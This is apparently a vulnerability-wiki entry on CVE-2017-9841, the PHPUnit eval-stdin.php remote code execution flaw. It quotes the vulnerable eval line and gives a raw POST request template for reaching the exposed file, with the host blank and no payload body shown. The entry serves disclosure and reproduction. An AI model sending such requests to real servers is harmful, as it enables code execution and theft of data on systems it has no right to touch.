# PHPUnit eval-stdin.php remote command execution vulnerability CVE-2017-9841

## Vulnerability Description

In the version before PHPUnit 5.6.3, there is a remote code execution vulnerability, which can obtain sensitive information and permissions of the server.

## Vulnerability Impact

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">PHPUnit < 5.6.3</span>

## Vulnerability reappears

The vulnerability is located in `/phpunit/src/Util/PHP/eval-stdin.php`

The key code is:

```plain
eval('?>'.file_get_contents('php://input'));
```

Send the following request package to execute PHP code

```plain
POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1
Host: 
Content-Length: 21
Accept-Encoding: gzip
```

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10-20220313100236521.png)